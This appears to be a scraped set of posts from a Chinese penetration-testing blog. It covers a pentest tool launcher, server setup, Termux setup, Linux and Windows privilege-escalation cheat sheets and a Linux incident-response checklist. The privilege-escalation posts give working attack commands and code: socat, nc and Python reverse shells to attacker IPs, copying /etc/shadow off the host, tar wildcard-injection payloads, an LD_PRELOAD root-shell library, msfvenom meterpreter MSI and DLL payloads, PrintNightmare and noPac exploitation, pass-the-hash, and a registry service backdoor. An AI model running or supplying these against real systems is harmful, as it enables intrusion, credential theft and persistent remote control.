一款模块化工具，可以为命令行工具提供通用GUI界面。让你拥有自己喜欢的工具包。不论是在虚拟机里！还是装在U盘里！都可即插即用！ 技术栈：Python + tkinter + toml [+] 功能完善后再开源 另外，作为一个Linuxer，我还是很喜欢终端界面的🤭 三个好处 好心情：在肾透厕视或者攻防演练的时候，打开各种终端窗口，然后整个电脑乱的一批，很让人烦躁，NNZ可以减轻你在这方面的痛苦。 好简单：对于小白来说，很多工具不会用，不好学，有了前辈写好的配置文件，拿来可以直接梭哈了。 好方便：有一天你不小心运行了一个exe，发现中招了，这个时候电脑不干净了，你左思右想还是选择了重装系统，TA可以让你一小时恢复工作状态。 主要功能 启动器 (把其他有GUI界面的工具集成一下) 随便加了几个工具，没别的意思 ​ 渗透小工具 (现在还什么都没有，牛奶会有的，面包也会有的) ​ 命令行工具 (通用GUI界面，只需要写一份极其简单的配置文件即可，摆脱了在命令行里面切换各种目录的繁琐。) ​ Download：Github 目录与使用说明 加粗部分比较重要。 NNZ/ NNZ.exe res/ env/ python3/ python.exe java8/ bin/ java.exe javaw.exe env.toml images/ logo.png icon.png runs/ BurpSuite/ BurpSuite.bat BurpSuite.png */ SecLists/ simple_tools/ terminal_tools/ dirsearch/ dirsearch.py dirsearch.toml fscan/ fscan.exe fscan.toml gobuster dir/ gobuster.exe gobuster dir.toml gobuster dns/ gobuster.exe gobuster dns.toml 详细介绍 NNZ/res/env/toml # 用于记载便携式环境的位置,主要为terminal_tools提供索引, 终端工具中有一些时exe文件，所以加个None=''表示父进程为空。 # 此文件必须存在 java8 = &quot;res/env/jdk8/bin/java.exe&quot; java11 = &quot;res/env/jdk11/bin/java.exe&quot; python2 = &quot;res/env/python2/python.exe&quot; python3 = &quot;res/env/python3/python.exe&quot; None = '' NNZ/res/runs/BurpSuite/ # 拿BurpSuite举个栗子 NNZ/res/runs/BurpSuite/BurpSuite.bat NNZ/res/runs/BurpSuite/BurpSuite.png NNZ/res/runs/BurpSuite/BurpSuite.jar # 添加启动器的方法很简单： 1.在NNZ/res/runs/ 目录下面新建文件夹: [name]/； 2.在该文件夹下创建同名: [name].bat 文件； 3.在文件夹下添加图标文件 [name].png 必须是png格式； 4.编写bat文件，确保双击bat文件可以运行工具。 BurpSuite.bat ------------- cd /d %~dp0 start /B javaw.exe -Xmx8G -XX:-UseParallelGC -noverify -javaagent:BurpSuiteLoader.jar -Dfile.encoding=utf-8 -jar BurpSuite.jar ------------- # 这里用javaw.exe运行，可以自动创建新进程，与NNZ.exe进程分离，直接把工具的java.exe换成javaw.exe就行，Python对应的也有pythonw.exe。 # 同时也可以用于启动.jar .py .exe ..... 各种类型的程序，只要双击bat能运行就可。 # exe类型可以用下面的这种格式 Clash.bat ---------- cd /d %~dp0 start /b &quot;Clash&quot; &quot;Clash for Windows.exe&quot; ---------- # 环境也可以用自己添加的环境，这样方便构建自己的工具包 Godzilla.bat ---------- cd /d %~dp0 Start /b ../../env/jdk11/bin/javaw.exe -jar godzilla.jar ---------- # 也可以在文件夹下面调用子文件夹的exe文件 AntSword.bat ---------- cd /d %~dp0 start /b &quot;AntSword&quot; &quot;AntSword-Loader/AntSword.exe&quot; ---------- SecLists/ # 字典文件，主要为其他工具提供字典，个人常用的字典主要是 https://github.com/danielmiessler/SecLists simple_tools/ # 这个是渗透小工具界面的目录，暂时还没开发，先留着。 terminal_tools/ # 终端工具目录, 举几个栗子 - terminal_tools/dirsearch/ - dirsearch.py - dirsearch.toml * - * 最主要的就是这个dirsearch.toml文件，一定要和目录同名，因为程序是通过目录名索引的。 若目录名为: gobuster dir 则配置文件名: gobuster dir.toml 空格也要带上 文件内容就是给程序写一份文档: name: 工具名称，直接显示在GUI界面标签上 pname: 运行工具需要的字符串 ppname: 运行工具所需要的环境，这里的环境不是本机的环境，是通过NNZ/res/env/env.toml文件获取到的对应环境路径。 参数分为三种must_args(必须参数)、nomust_noinput_args(可选选项参数)、nomust_input_args(可选输入参数) [[must_args]] # 必须参数 arg_name = &quot;-u &quot; # 参数，注意-u后面加一个空格，用于拼接。这样设计的原因是有些参数没有空格比如: --exclude-size=2kb arg_more = &quot;添加目标url&quot; # 参数介绍，在GUI界面给人看的，随便写但是不要写太长了。 arg_text = &quot;https://127.0.0.1&quot; # 参数默认值 arg_enable = true # 默认是否启用 [[nomust_noinput_args]] # 可选选项参数 arg_name = &quot;-q &quot; # 参数，注意-q后面加一个空格 arg_more = &quot;[必须开启]安静模式&quot; # 参数介绍，（一般要关闭滚动条，否则显示会很乱） arg_enable = true # 默认是否启用 [[nomust_input_args]] # 可选输入参数 arg_name = &quot;-x &quot; # 参数，注意-x后面加一个空格 arg_more = &quot;过滤状态码&quot; # 参数介绍 arg_text = &quot;404,502,301&quot; # 参数默认值 arg_enable = true # 默认是否启用 以下为dirsearch.toml的配置文件，并没有写出所有功能，暂时只是记录了常用功能 --------------------- name = &quot;dirsearch&quot; pname = &quot;dirsearch.py&quot; ppname = &quot;python3&quot; # 运行的时候通过env.toml文件获取环境路径python3 = &quot;res/env/python3/python.exe&quot; [[must_args]] arg_name = &quot;-u &quot; arg_more = &quot;添加目标url&quot; arg_text = &quot;https://127.0.0.1&quot; arg_enable = true [[nomust_noinput_args]] arg_name = &quot;-q &quot; arg_more = &quot;[必须开启]安静模式&quot; arg_enable = true [[nomust_noinput_args]] arg_name = &quot;-r &quot; arg_more = &quot;递归扫描&quot; arg_enable = false [[nomust_input_args]] arg_name = &quot;-x &quot; arg_more = &quot;过滤状态码&quot; arg_text = &quot;404,502,301&quot; arg_enable = true [[nomust_input_args]] arg_name = &quot;--exclude-size=&quot; # 参数加空格的罪魁祸首 arg_more = &quot;过滤指定大小返回包&quot; arg_text = &quot;2KB&quot; arg_enable = true [[nomust_input_args]] arg_name = &quot;-w &quot; arg_more = &quot;选择字典&quot; arg_text = &quot;res/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt&quot; # 默认的字典位置，很方便的。 arg_enable = false --------------------- # 对于gobuster这类工具，第一个参数是选择功能模块，那么将其各个功能分开单独创建文件夹 比如以下两个目录： gobuster dir/ gobuster dns/ 其中的exe文件命名可以不更改: gobuster.exe 在配置文件中将pname = &quot;gobuster.exe&quot;更改为： pname = &quot;gobuster.exe dir&quot;、 pname = &quot;gobuster.exe dns&quot; 即可。 几份现有的配置文件，仅供参考 res/terminal_tools/dirsearch/dirsearch.toml res/terminal_tools/fscan/fscan.toml res/terminal_tools/ehole/ehole.toml (该版本是Github上面拉下来最新代码自行构建的) res/terminal_tools/gobuster dir/gobuster dir.toml res/terminal_tools/gobuster dns/gobuster dns.toml ","link":"https://Zer0-hex.github.io/nnz-yi-kuan-mo-kuai-hua-tong-yong-gui-jie-mian/"},{"title":"云服务器部署","content":"云服务器部署 当你购买或者白嫖一台云服务器时，你需要做以下动作 (Debian 11) 基本设置 Base # apt update &amp;&amp; apt upgrade # apt install zip tmux man git curl unzip perl wget ranger python openjdk-11-jdk openjdk-11-jdk-headless # apt install nmap sqlmap # 增加2G虚拟内存 # dd if=/dev/zero of=/swapfile2 bs=1M count=2048 # chmod 0600 /swapfile2 # mkswap /swapfile2 # swapon /swapfile2 # sysctl vm.swappiness=60 # echo '/swapfile2 swap swap defaults' &gt;&gt; /etc/fstab 开发环境 $ mkdir ~/Github $ mkdir ~/Downloads $ pip config set global.index-url https://mirrors.bfsu.edu.cn/pypi/web/simple $ python3 -m pip install pip --upgrade $ cd ~/Downloads $ wget https://golang.google.cn/dl/go1.18.6.linux-amd64.tar.gz $ sudo rm -rf /usr/local/go &amp;&amp; sudo tar -C /usr/local -xzf go1.18.6.linux-amd64.tar.gz $ echo &quot;export PATH=\\$PATH:/usr/local/go/bin&quot; &gt;&gt; ~/.bashrc Docker $ sudo apt remove docker docker-engine docker.io containerd runc $ sudo apt update $ sudo apt install apt-transport-https ca-certificates gnupg2 software-properties-common $ curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add - $ sudo apt-key fingerprint 0EBFCD88 $ sudo add-apt-repository &quot;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://mirrors.bfsu.edu.cn/docker-ce/linux/debian $(lsb_release -cs) stable&quot; $ sudo apt update $ sudo apt install docker-ce docker-ce-cli containerd.io $ sudo usermod -aG docker `whoami` $ pip install docker-compose $ reboot vim $ git clone --depth=1 https://github.com/amix/vimrc.git ~/.vim_runtime $ sh ~/.vim_runtime/install_awesome_vimrc.sh tmux $ cd $ git clone https://github.com/gpakosz/.tmux.git $ ln -s -f .tmux/.tmux.conf $ cp .tmux/.tmux.conf.local . 渗透环境部署 资产管理系统 (ARL) $ cd ~/Github $ git clone https://github.com/TophantTechnology/ARL.git $ cd ARL/docker/ $ docker volume create arl_db $ docker-compose pull $ docker-compose up -d cd ~/Github &amp;&amp; git clone https://github.com/TophantTechnology/ARL.git &amp;&amp; cd ARL/docker/ &amp;&amp; docker volume create arl_db &amp;&amp; docker-compose pull &amp;&amp; docker-compose up -d 这里我比较喜欢把映射的443端口改为5003端口，因为443要留给CobaltStrike(滑稽)。 Vipser # 设置安装目录 $ export VIPER_DIR=~/Github/Viper $ mkdir -p $VIPER_DIR &amp;&amp; cd $VIPER_DIR $ tee docker-compose.yml &lt;&lt;-'EOF' version: &quot;3&quot; services: viper: image: registry.cn-shenzhen.aliyuncs.com/toys/viper:latest container_name: viper-c network_mode: &quot;host&quot; restart: always volumes: - ${PWD}/loot:/root/.msf4/loot - ${PWD}/db:/root/viper/Docker/db - ${PWD}/module:/root/viper/Docker/module - ${PWD}/log:/root/viper/Docker/log - ${PWD}/nginxconfig:/root/viper/Docker/nginxconfig command: [&quot;VIPER_PASSWORD&quot;] EOF $ export VIPER_PASSWORD=Zer0-hex $ sed -i &quot;s/VIPER_PASSWORD/$VIPER_PASSWORD/g&quot; docker-compose.yml $ docker-compose config $ docker-compose pull # 启动viper，访问60000端口 $ cd ~/Github/Viper &amp;&amp; docker-compose up -d frp cd ~/Github git clone https://github.com/fatedier/frp.git cd frp &amp;&amp; make SecLists $ cd ~/Github git clone https://github.com/danielmiessler/SecLists.git ","link":"https://Zer0-hex.github.io/yun-fu-wu-qi-bu-shu/"},{"title":"Linux提权","content":"Linux提权 CVE提权 CVE 2021-3560 (Polkit) CVE 2021-4034 (pwnkit) CVE 2022-0847 (DirtyPipe) 利用 https://github.com/liamg/traitor/ sudo配置提权 在Linux系统中，sudo是一个很好用的权限管理工具，它允许用户在运行某些命令时提升自己的权限。但错误的配置会导致sudo被利用与提权。 sudo文件语法 vim /etc/sudoers #Username Host=(run as) command to execute root ALL=(ALL:ALL) ALL user1 ALL=(root) NOPASSWD:/bin/find 查找当前用户可以执行的高权限命令 $ sudo -l ----------------------- 一般可利的用输出结果如下所示 $ sudo -l Matching Defaults entries for root on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User root may run the following commands on localhost: (root) NOPASSWD: /usr/bin/perl /usr/bin/python /usr/bin/less /usr/bin/awk /usr/bin/man.... perl $ sudo perl -e 'exec &quot;/bin/bash&quot;' python $ sudo python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' less $ sudo less /etc/hosts !bash awk $ sudo awk 'BEGIN {system(&quot;/bin/bash&quot;)}' man $ sudo man man !bash vi/vim $ sudo vi/vim :!bash env sudo env /bin/bash ftp sudo ftp ! /bin/bash socat 客户机： socat file:`tty`,raw,echo=0 tcp-listen:1234 受害机： sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234 scp 可以下载存放密码密文的文件 sudo scp /etc/shadow root@192.168.1.2:~/ other 有时会出现自定义的脚本被添加sudo权限的情况，对于此种情况下，如果有写权限，那么可以直接覆盖。 SUID 提权 suid可以让普通用户运行的程序以高权限运行，方便管理的同时也方便了提权。 查找具有SUID权限的程序 find / -perm -u=s -type f 2&gt;/dev/null cp 如果CP拥有SUID权限，那么有两种利用方式。 1、利用openssl生成密码，添加新的用户到Linux的/etc/Passwd文件中 openssl passwd -1 -salt hack 2333 $1$hack$hA86ImU4cvh4bQFNvSULf1 cp /etc/passwd /tmp/passwd 本地修改文件，添加一行 &quot;hack:$1$hack$hA86ImU4cvh4bQFNvSULf1:0:0:root:/root:/bin/bash&quot; 再上传至目标的/tmp目录下，然后使用cp命令复制到/etc/passwd文件中 su hack 输入密码即可获取root权限 2、利用计划任务反弹shell find touch /tmp/tmp find /tmp/tmp -exec &quot;whoami&quot; \\; vim/nano等编辑器 1、visudo命令调用vim修改/etc/sudoer文件，为当前用户添加权限，完成提权 2、通过编辑器修改/etc/passwd文件完成提权 3、查看/etc/shadow文件，爆破高权限用户密码。 bash bash -p python import os os.ststem('/bin/sh') 容器/虚拟化工具提权 在拥有容器权限时，可以利用容器挂载本地的目录。 通过sudoer、passwd、shadow等配置文件提权。 LXD Docker 计划任务 查看计划任务中运行的脚本，如果具有写权限，即可diy脚本提权。 通配符注入 https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/ 条件，已知将要运行的tar 1.tar *命令 例如：/etc/crontab */1 * * * * root tar -zcf /var/backups/html.tgz /var/www/html/* Linux在利用通配符时，会将匹配的字符串匹配到命令中，因此可以通过修改文件名的方式，构造恶意命令。 tar命令可以通过两个参数执行脚本 --checkpoint-action=exec=sh 1.sh&quot; --checkpoint=1 Payload-反弹Shell echo &quot;mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp&quot; &gt; shell.sh echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot; echo &quot;&quot; &gt; --checkpoint=1 tar cf archive.tar * Payload-添加SUID权限 echo &quot;chmod u+s /usr/bin/find&quot; &gt; test.sh echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot; echo &quot;&quot; &gt; --checkpoint=1 tar cf archive.tar * ls -al /usr/bin/find find f1 -exec &quot;whoami&quot; \\; root find f1 -exec &quot;/bin/sh&quot; \\; id whoami LD_Preload劫持，sudo提权(有点鸡肋) 有些具高权限的命令在运行时从环境变量LD_Preload中获取链接库的位置，例如以下这些位置 /etc/ld.so.* /lib/ld-linux.so 可以通过劫持一些程序必定调用的函数，来获取Shell。 高权限的命令劫持到的Shell自然是高权限。 payload vim fuckld.c ------------------------------------------------------ #include&lt;stdlib.h&gt; #include&lt;stdio.h&gt; #include&lt;string.h&gt; __attribute__((__constructor__)) void preload (){ unsetenv(&quot;LD_PRELOAD&quot;); setgid(0); setuid(0); system(&quot;/bin/sh&quot;); } 条件 sudo配置文件中添加一行 Defaults env_keep += LD_PRELOAD sudo -l 可以看到字样 利用 # 编译 gcc -shared -fPIC fuckid.c -o /tmp/fuckld.so # 修改环境变量 ls LD_PRELOAD=/tmp/fuckld.so sudo LD_PRELOAD=/tmp/fuckld.so find PATH环境变量提权 有些命令具有SUID权限，并且会调用其他命令，因此可以通过劫持对应的命令来提权 某SUID权限程序 #include&lt;unistd.h&gt; void main() { setuid(0); setgid(0); system(&quot;ps&quot;); } 劫持的命令 echo &quot;/bin/bash&quot; &gt; /tmp/ps chmod 777 /tmp/ps 劫持PATH环境变量 前面的路径优先调用 export PATH=/tmp:$PATH Python库劫持 样例文件，1.py import goodrequests goodlib.get(&quot;baidu.com&quot;) 恶意库(被劫持的库)，goodrequests.py def get(): import os import pty import socket import subprocess s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&quot;127.0.0.1&quot;,2333)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) pty.spawn(&quot;/bin/bash&quot;) ","link":"https://Zer0-hex.github.io/linux-ti-quan/"},{"title":"Android Termux 部署随身Linux环境","content":"Termux —— 便携式Linux 下载地址: (F-Droid)[https://f-droid.org/packages/com.termux/] (Github)[https://github.com/termux/termux-app/releases] Google Play上的是旧版，不建议下载。 基本配置 # 更换国内镜像源 termux-change-repo # 空格选中，回车OK。(建议BFSU) # 首先安装ssh，方便管理 pkg update pkg install openssh vim # 修改密码 passwd # 然后在局域网通过电脑ssh登录，用户名随意，端口8022 ssh m@127.0.0.1 -p 8022 # 更新系统 pkg upgrade # 开启文件权限，自动映射download等基本路径，在~/storage/目录下 termux-setup-storage # 有root权限的安装tsu，没有root权限安装proot # pkg install proot # 补充一下软件 pkg install zip tmux man git curl unzip perl wget pkg-config pkg install openssl openssl-static libffi libffi-static libxml2 pkg install libpcap libgrpc libgmp libtool libxslt libsqlite pkg install golang clang python make cmake ruby pkg install ncurses ncurses-utils ranger neofetch postgresql pkg install readline findutils coreutils bison autoconf binutils apr apr-util pkg install termux-tools termux-elf-cleaner # 上面的全部 pkg install zip tmux man git curl unzip perl wget pkg-config openssl openssl-static libffi libffi-static libxml2 libpcap libgrpc libgmp libtool libxslt libsqlite golang clang python make cmake ruby ncurses ncurses-utils ranger neofetch postgresql readline findutils coreutils bison autoconf binutils apr apr-util termux-tools termux-elf-cleaner Termux配置 虚拟键盘 vim ~/.termux/termux.properties --------------------------------------------------------------------- extra-keys = [ \\ ['ESC','~','`','/','UP','BACKSLASH'], \\ ['TAB','CTRL','ALT','LEFT','DOWN','RIGHT'] \\ ] 问候语 (https://www.bootschool.net/ascii 在线生成) vim $HOME/../usr/etc/motd ---------------------------------------------------------------------- ████████ ████ ██ ░░░░░░██ █░░░██ ░██ ██ █████ ██████░█ █░█ ░██ █████ ██ ██ ██ ██░░░██░░██░░█░█ █ ░█ █████░██████ ██░░░██░░██ ██ ██ ░███████ ░██ ░ ░██ ░█░░░░░ ░██░░░██░███████ ░░███ ██ ░██░░░░ ░██ ░█ ░█ ░██ ░██░██░░░░ ██░██ ████████░░██████░███ ░ ████ ░██ ░██░░██████ ██ ░░██ ░░░░░░░░ ░░░░░░ ░░░ ░░░░ ░░ ░░ ░░░░░░ ░░ ░░ 备份与恢复 备份 Termux 至手机本地Download文件夹中 termux-setup-storage cd $HOME/../ tar -jcvf /sdcard/Download/termux-backup.tar.bz2 home usr 从手机本地Download文件夹中恢复Termux备份 termux-setup-storage cd $HOME/../ tar -jcvf /sdcard/Download/termux-backup.tar.bz2 --recursive-unlink --preserve-permissions Bash配置 ( vim ~/.bashrc ) # ~/.bashrc: executed by bash(1) for non-login shells. # see /usr/share/doc/bash/examples/startup-files (in the package bash-doc) # for examples # 提示符生成器 export PS1=&quot;\\[\\033[38;5;14m\\][\\[$(tput sgr0)\\]\\[\\033[38;5;9m\\]\\w\\[$(tput sgr0)\\]\\[$(tput sgr0)\\]\\[\\033[38;5;216m\\]\\$(git branch 2&gt; /dev/null | sed -e '/^[^*]/d' -e 's/* \\(.*\\)/ (\\1)/')\\[$(tput sgr0)\\]\\[\\033[38;5;14m\\]]\\[$(tput sgr0)\\]\\[\\033[38;5;201m\\]@\\[$(tput sgr0)\\]\\[\\033[38;5;11m\\]Termux\\[$(tput sgr0)\\]\\[\\033[38;5;160m\\]:\\[$(tput sgr0)\\]\\[\\033[38;5;10m\\]\\\\$\\[$(tput sgr0)\\] &quot; # 命令补全(bash-completion) # 对于找不到的命令，提示软件包 影响速度 # pacman -Sy pkgfile &amp;&amp; pkgfile --update # source /usr/share/doc/pkgfile/command-not-found.bash # 输入路径自动添加cd shopt -s autocd # 修成意外换行字符覆盖 shopt -s checkwinsize # 历史命令添加到文件 shopt -s histappend # 不在历史中记录重复的行和空格开头的行 HISTCONTROL=ignoreboth # 彩色的man export LESS_TERMCAP_mb=$(tput bold; tput setaf 2) # green export LESS_TERMCAP_md=$(tput bold; tput setaf 6) # cyan export LESS_TERMCAP_me=$(tput sgr0) export LESS_TERMCAP_so=$(tput bold; tput setaf 3; tput setab 4) # yellow on blue export LESS_TERMCAP_se=$(tput rmso; tput sgr0) export LESS_TERMCAP_us=$(tput smul; tput bold; tput setaf 7) # white export LESS_TERMCAP_ue=$(tput rmul; tput sgr0) export LESS_TERMCAP_mr=$(tput rev) export LESS_TERMCAP_mh=$(tput dim) export LESS_TERMCAP_ZN=$(tput ssubm) export LESS_TERMCAP_ZV=$(tput rsubm) export LESS_TERMCAP_ZO=$(tput ssupm) export LESS_TERMCAP_ZW=$(tput rsupm) export GROFF_NO_SGR=1 # For Konsole and Gnome-terminal # 一些别名 alias ll='ls -alh' alias la='ls -A' alias l='ls -CFlh' alias ls='ls --color=auto' alias dir='dir --color=auto' alias vdir='vdir --color=auto' alias grep='grep --color=auto' alias fgrep='fgrep --color=auto' alias egrep='egrep --color=auto' alias upgrade='pkg update &amp;&amp; pkg upgrade' # 环境变量 export PATH=&quot;$HOME/.local/bin:$PATH&quot; Tmux配置 cd git clone https://github.com/gpakosz/.tmux.git ln -s -f .tmux/.tmux.conf cp .tmux/.tmux.conf.local . Vim配置 git clone --depth=1 https://github.com/amix/vimrc.git ~/.vim_runtime sh ~/.vim_runtime/install_awesome_vimrc.sh 开发环境 C、Java、Python、Go、Rust、PHP、Rust pkg install -y clang make cmake openjdk-17 ecj dx golang python php rust pip镜像源 pip config set global.index-url https://mirrors.bfsu.edu.cn/pypi/web/simple 渗透环境部署 常见工具 pkg install exiftool nmap nmap-ncat pip install sqlmap cd $HOME &amp;&amp; mkdir Github &amp;&amp; cd Github git clone https://github.com/EASY233/Finger # dirsearch 依赖的cryptography库需要用pkg安装 pkg install python-cryptography git clone https://github.com/maurosoria/dirsearch xray https://github.com/chaitin/xray/releases/ # 注意ARM64架构 cd $HOME/Github &amp;&amp; mkdir xray wget https://github.com/chaitin/xray/releases/download/1.8.4/xray_linux_arm64.zip unzip xray_linux_arm64.zip ./xray_linux_arm64 webscan --listen 127.0.0.1:2333 --html-output 2333.html # 试运行 fscan从Github构建 cd $HOME/Github git clone https://github.com/shadow1ng/fscan cd fscan go build metasploit wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh chmod +x metasploit.sh ./metasploit.sh 常见问题 libssl.so.1.1 not found (主要是版本原因，建议去Github下载) # CANNOT LINK EXECUTABLE &quot;/data/data/com.termux/files/usr/lib/apt/methods/https&quot;: library &quot;libssl.so.1.1&quot; not found find /data/data/com.termux/files -name 'libssl.so' # 查找openssl-1.1的位置 export LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib/openssl-1.1/ # 添加给库变量LD_LIBRARY_PATH echo &quot;export LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib/openssl-1.1/&quot; &gt;&gt; ~/.bashrc # Bash环境永久生效 ","link":"https://Zer0-hex.github.io/android-termux-bu-shu-sui-shen-linux-huan-jing/"},{"title":"Windows提权","content":"Windows提权 在Windows机器上，权限不足很致命，很多操作会有限制，很难横向。这时候就需要很骚的提权操作了。 以下提权手法应当按优先考虑，尽量用最简单的方式快速提权。 如果可以控制桌面 Win + R -&gt; azman.msc -&gt; 帮助 -&gt; 右键打开源文件位置 -&gt; 打开 -&gt; cmd 如果任何用户具有管理员访问权限，即使该用户没有完全或更高的权限 可以通过修改编辑器的默认打开权限，然后链式调用cmd提权。 内核漏洞提权 内核漏洞提权可以根据当前机器的版本以及其所打的补丁来判断，可以利用自动化工具一键扫描。 &gt; systeminfo &gt; systeminfo.txt ...wesng/&gt;python wes.py -u ...wesng/&gt;python wes.py systeminfo.txt -e -i &quot;Remote Code Execution&quot; MSI自动安装策略提权 检查注册表是否开启相关功能 reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer 默认值为0x1则为开启自动安装。 生成.msi木马 msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=443 -f msi &gt; /tmp/1.msi 也可以生成命令执行的msi，将用户加入到管理员组 msfvenom -p windows/exec CMD='net localgroup administrators raaz /add' -f msi &gt; /tmp/2.msi 运行安装 msiexec /quiet /qn /i 1.msi msf集成模块 use exploit/windows/local/always_install_elevated msf exploit(always_install_elevated) &gt; set session 1 msf exploit(always_install_elevated) &gt; exploit 打印机提权 首先，你需要一个PrintSpoofer.exe。 PrintSpoofer PrintSpoofer64.exe -i -c cmd CVE CVE-2021-36934 获取管理员哈希 运行exp即可获取以下文件 SAM System Security ---------------------------- python3 secretsdump.py -sam /root/SAM -system /root/SYSTEM -security /root/SECURITY LOCAL 权限提升 利用Hash传递 python3 psexec.py -hashes 00000000000000000000000000000000:7ce21f17c0aee7fb9ceba532d0546ad6 administrator@192.168.1.145 CVE-2021-42278 补丁 KB5008602 – https://support.microsoft.com/en-us/topic/november-14-2021-kb5008602-os-build-17763-2305-out-of-band-8583a8a3-ebed-4829-b285-356fb5aaacd7 KB5008380 – https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041 EXP git clone https://github.com/Ridter/noPac python3 noPac.py ignite.local/sakshi:'Password@1' -dc-ip 192.168.1.1 -shell --impersonate administrator -use-ldap 注册表自启动提权 需要操作的注册表 HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\当前版本\\运行 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce 详情 未加引号的服务路径 如果存在一个服务，其可执行程序的路径为： C:\\Program Files\\Ignite Data\\Vuln Service\\file.exe 那么以下路径的EXE可以劫持此服务 C:\\Program Files\\Ignite Data\\Vuln.exe C:\\Program Files\\Ignite.exe C:\\Program.exe 拥有所有权限的注册表提权 服务同理 利用工具AccessChk进行检查。 .\\accesschk.exe /accepteula &quot;authenticated users&quot; -kvuqsw hklm\\System\\CurrentControlSet\\services ------------------------------------------------------------------------------ RW HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\pentest KEY_ALL_ACCESS ------------------------------------------------------------------------------ 发现可利用注册表服务，查询程序路径： reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\pentest 查看权限 Get-Acl -Path HKLM：\\SYSTEM\\CurrentControlSet\\Services\\pentest 加个马 reg add &quot;HKLM\\system\\currentcontrolset\\services\\pentest&quot; /t REG_EXPAND_SZ /v ImagePath /d “C:\\backdoor.exe” /f 拥有所有权限的服务提权 msf集成 use exploit/windows/local/service_permissions set lhost 192.168.1.3 set session 1 exploit 计划任务劫持提权 查找可以劫持的计划任务 schtasks /query /fo LIST /v PrintNightmare https://www.hackingarticles.in/windows-privilege-escalation-printnightmare/ 利用两个CVE CVE-2021-34527 远程代码执行 CVE-2021-1675 本地权限提升 Python RCE 生成dll马 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f dll -o evil.dll 开启监听 use multi/handler set payload windows/x64/meterpreter/reverse_tcp set LHOST 192.168.1.2 set LPORT 4444 exploit 加载CVE-2021-1675 EXP模块 use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare set RHOSTS 192.168.1.190 set SMBUser ignite set SMBPass 123 set DLL_PATH / exploit 利用CVE-2021-34527执行命令 git clone https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 cd PrintNightmare-CVE-2021-34527 chmod 777 CVE-2021-34527.py 共享恶意dll所在路径 python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /root ./CVE-2021-34527.py ignite:123@192.168.1.190 '\\\\192.168.1.2\\share\\evil.dll' ","link":"https://Zer0-hex.github.io/windows-ti-quan/"},{"title":"Linux应急响应","content":"Linux入侵简单排查 Work with Kerno 账号安全排查 /etc/passwd /etc/shadow awk -F: '$3==0 {print $1}' /etc/passwd // 排查超级用户 last // 查看最近用户登录，注销信息 lastlog -u USER // 查看指定用户登录信息 #排查处理 userdel -r user #删除user用户,且删除/home目录下的账户目录 进程排查 ps aux //进程相关信息 ls -l /proc/PID/file //查看pid所对应的进程文件路径 lsof -c [进程] //某个进程所打开相关文件信息 #排查处理 kill -9 [进程号] rm -rf [文件] 端口排查 netstat -antlp | more #排查处理 netstat -anp | grep PORT kill -9 [进程号] 计划任务排查 crontab -l /var/spool/cron/* 在排查以上内容完成处理后，仍有恶意计划任务启动，排查以下文件 /etc/crontab /etc/anacrontab var/spool/anacron /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/* #排查处理 当只需要删除某一条计划任务时，可以通过“crontab -e”命令进行编辑 而若要清空某个用户的所有计划任务，可以执行“crontab -r”命令 历史命令排查 history //root历史命令 /home/{user}/.bash_history //普通用户账号历史命令 #排查处理 cat .bash_history &gt;&gt; 1.txt #留存分析 日志排查 #查看 Linux ssh 登陆审计日志 /var/log/secure #Centos 与 RedHat 日志路径 /var/log/auth.log #Ubuntu 与 Debian 日志路径 附件 https://git.io/linux &lt;!--linux命令查询--&gt; https://github.com/grayddq/GScan/releases &lt;!--快速安全检查脚本--&gt; 检查脚本 #!/bin/bash echo &quot;usage:./LinuxChk.sh &gt;a.txt&quot; echo ---------------------------------------------------------- echo &quot;本机IP：&quot; ifconfig -a| grep --color &quot;\\([0-9]\\{1,3\\}\\.\\)\\{3\\}[0-9]\\{1,3\\}&quot; echo &quot;内核版本&quot; uname -a echo ---------------------------------------------------------- echo &quot;检查网络连接和监听端口&quot; netstat -anp | grep &quot;tcp&quot; echo ---------------------------------------------------------- echo &quot;可能的危险连接&quot; netstat -anp | grep &quot;4433|4444|3333|5555|2222|1111&quot; echo ---------------------------------------------------------- echo &quot;查看僵尸进程（此处进程可自行指定）&quot; ps -ef | grep &quot;miner|zombie|xmr|pool|hook&quot; | grep -v grep echo 